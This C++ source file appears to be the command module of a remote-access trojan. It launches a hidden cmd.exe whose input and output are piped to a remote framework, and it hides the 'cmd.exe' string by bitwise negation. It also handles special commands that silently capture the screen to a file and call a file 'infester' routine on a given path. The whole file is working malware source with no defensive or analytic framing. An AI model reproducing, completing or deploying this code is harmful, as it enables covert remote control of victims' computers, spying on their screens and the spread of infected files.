#include "../inc/CmdProcess.h"
#include "../../RemoteClient/RemoteClientFrameWork.h"

static char EngChar[]={~'\\',~'c',~'m',~'d',~'.',~'e',~'x',~'e','\0'};

BOOL CmdProcess::Initialize( CmdProcess_IO &info )
{
	SECURITY_ATTRIBUTES sa;
	sa.nLength=sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor=0;
	sa.bInheritHandle=TRUE;   

	if(!CreatePipe(&m_hReadPipe1,&m_hWritePipe1,&sa,0))
	{
		return FALSE;
	}
	if(!CreatePipe(&m_hReadPipe2,&m_hWritePipe2,&sa,0))
	{
		return FALSE;
	}

	STARTUPINFO si;
	ZeroMemory(&si,sizeof(si));
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = m_hReadPipe2;
	si.hStdOutput = si.hStdError = m_hWritePipe1;
	
	//printf(EngChar);

	char cmdLine[256] = {0};
	GetSystemDirectory(cmdLine,sizeof(cmdLine));
	for (unsigned int i=0;i<strlen(EngChar);i++)
	{
		EngChar[i]=~EngChar[i];
	}

	strcat_s(cmdLine,EngChar);

	
	PROCESS_INFORMATION ProcessInformation;  

	//DEBUG_PROCESS for exit while this process was crashed.
	if(CreateProcess(cmdLine,NULL,NULL,NULL,TRUE,0,NULL,NULL,&si,&ProcessInformation) == 0)  
	{  
		return FALSE;  
	} 
	return TRUE;
}

void CmdProcess::run()
{
	//Receive buffer size must be large than 3
	assert(sizeof(m_RecvBuffer)>3);

	DWORD dwRere=0;

	while(TRUE)
	{
		
		PeekNamedPipe(m_hReadPipe1,m_RecvBuffer, sizeof(m_RecvBuffer),&m_lBytesRead,0,0);
		if(m_lBytesRead)
		{
		memset(m_RecvBuffer, 0, sizeof(m_RecvBuffer));  

		if(ReadFile(m_hReadPipe1,m_RecvBuffer,sizeof(m_RecvBuffer)-2,&m_lBytesRead,0))
		{
			if (m_RecvBuffer[sizeof(m_RecvBuffer)-3]&0x80)
			{
				if(!ReadFile(m_hReadPipe1,m_RecvBuffer+sizeof(m_RecvBuffer)-2,1,&dwRere,0))
					break;
			}
			CmdProcess_I In;
			In.Buffer=m_RecvBuffer;
			In.size=m_lBytesRead+dwRere;
			Recv(In);
		}
		else
		{
			break;
		}
		}
		else
		{
			Sleep(300);
		}
	}
}

bool  CmdProcess::SpecialCommand(char *cmd)
{
	if (strlen(cmd)>11)
	{
		char MSG[12];
		memcpy(MSG,cmd,11);
		MSG[11]='\0';

		if (strcmp(strupr(MSG),REMOTESHELL_CCMD_SCREENSHOT)==0)
		{
			
			strtok(cmd," ");
			char *Dest=strtok(NULL," ");
			char MaxPath[MAX_PATH];
			strcpy(MaxPath,Dest);
			for (int i=0;i<strlen(MaxPath);i++)
			{
				if (MaxPath[i]=='\r'||MaxPath[i]=='\n')
				{
					MaxPath[i]='\0';
				}
			}

			ScreenCapture(MaxPath);
			return true;
		}
	}

	if (strlen(cmd)>7)
	{
		char MSG[8];
		memcpy(MSG,cmd,7);
		MSG[7]='\0';

		if (strcmp(strupr(MSG),REMOTESHELL_CCMD_INFEST)==0)
		{
			strtok(cmd," ");
			char *Dest=strtok(NULL," ");
			char MaxPath[MAX_PATH];
			strcpy(MaxPath,Dest);
			for (int i=0;i<strlen(MaxPath);i++)
			{
				if (MaxPath[i]=='\r'||MaxPath[i]=='\n')
				{
					MaxPath[i]='\0';
				}
			}
			XInfester_InfestFile(MaxPath);
			return true;
		}
	}
	return false;
}


size_t CmdProcess::Send( CmdProcess_O &Out )
{
	if(SpecialCommand(Out.Buffer))
	{
		return 0;
	}

 	WriteFile(m_hWritePipe2, "\r\n",2,&m_lBytesWrite,0);  
 	Sleep(100);  

	if(!WriteFile(m_hWritePipe2, Out.Buffer,Out.size,&m_lBytesWrite,0))                       
	{    
		return 0;  
	}  
	return m_lBytesWrite;
}

void CmdProcess::Recv( CmdProcess_I &in )
{
	G_RemoteFrameWork.OnCmdReply(in.Buffer,in.size);
}

void CmdProcess::Close()
{
	CloseHandle(m_hReadPipe1);
	CloseHandle(m_hReadPipe2);
	CloseHandle(m_hWritePipe1);
	CloseHandle(m_hWritePipe2);
}
 


void ScreenCapture(LPSTR filename, WORD BitCount, LPRECT lpRect){
	HBITMAP hBitmap;
	HDC hScreenDC = GetWindowDC(NULL);//CreateDC("DISPLAY", NULL, NULL, NULL);
	HDC hmemDC = CreateCompatibleDC(hScreenDC);


	int ScreenWidth = GetSystemMetrics(SM_CXSCREEN);//GetDeviceCaps(hScreenDC, HORZRES);
	int ScreenHeight = GetSystemMetrics(SM_CYSCREEN);//GetDeviceCaps(hScreenDC, VERTRES);


	HBITMAP hOldBM;
	PVOID lpvpxldata;
	INT ixStart;
	INT iyStart;
	INT ix;
	INT iy;
	DWORD dwBitmapArraySize;
	DWORD nBitsOffset;
	DWORD lImageSize;
	DWORD lFileSize;
	BITMAPINFO bmInfo;
	BITMAPFILEHEADER bmFileHeader;
	HANDLE hbmfile;
	DWORD dwWritten;

	if (lpRect == NULL)
	{
		ixStart = iyStart =0;
		ix = ScreenWidth;
		iy = ScreenHeight;
	}else{
		ixStart = lpRect->left;
		iyStart = lpRect->top;
		ix = lpRect->right - lpRect->left;
		iy = lpRect->bottom - lpRect->top;
	}

	hBitmap = CreateCompatibleBitmap(hScreenDC, ix, iy);

	hOldBM = (HBITMAP)SelectObject(hmemDC, hBitmap);

	BitBlt(hmemDC, 0, 0, ix, iy, hScreenDC, ixStart, iyStart, SRCCOPY);

	hBitmap = (HBITMAP)SelectObject(hmemDC, hOldBM);


	if (filename == NULL)
	{
		DeleteDC(hScreenDC);
		DeleteDC(hmemDC);
		return ;
	}

	dwBitmapArraySize = ((ix*32/8+3)/4*4)*iy; //((((ix*32) + 31) & ~31) >> 3) *iy;
	lpvpxldata = HeapAlloc(GetProcessHeap(), HEAP_NO_SERIALIZE, dwBitmapArraySize);
	ZeroMemory(lpvpxldata, dwBitmapArraySize);


	ZeroMemory(&bmInfo, sizeof(BITMAPINFO));
	bmInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmInfo.bmiHeader.biWidth = ix;
	bmInfo.bmiHeader.biHeight = iy;
	bmInfo.bmiHeader.biPlanes = 1;
	bmInfo.bmiHeader.biBitCount = BitCount;
	bmInfo.bmiHeader.biCompression = BI_RGB;


	ZeroMemory(&bmFileHeader, sizeof(BITMAPFILEHEADER));
	nBitsOffset = sizeof(BITMAPFILEHEADER) + bmInfo.bmiHeader.biSize;
	lImageSize = (((bmInfo.bmiHeader.biWidth * bmInfo.bmiHeader.biBitCount)/8+3)/4*4)*bmInfo.bmiHeader.biHeight; //((((bmInfo.bmiHeader.biWidth * bmInfo.bmiHeader.biBitCount) + 31) & ~31) >> 3)*bmInfo.bmiHeader.biHeight;
	lFileSize = nBitsOffset + lImageSize;
	bmFileHeader.bfType = 'B' +('M'<<8);
	bmFileHeader.bfSize = lFileSize;
	bmFileHeader.bfOffBits = nBitsOffset;


	GetDIBits(hmemDC, hBitmap, 0, bmInfo.bmiHeader.biHeight, lpvpxldata, &bmInfo, DIB_RGB_COLORS);
	//GetBitmapBits(hBitmap,dwBitmapArraySize,lpvpxldata);

	FILE *pf=fopen(filename,"wb");

	if (pf != NULL)
	{
		fwrite(&bmFileHeader, sizeof(BITMAPFILEHEADER),1,pf);
		fwrite(&bmInfo,		  sizeof(BITMAPINFO),1,pf);
		fwrite(lpvpxldata,	  lImageSize,1,pf);
		fclose(pf);
	}
	

	HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, lpvpxldata);
	ReleaseDC(0, hScreenDC);
	DeleteDC(hmemDC);
	return ;
}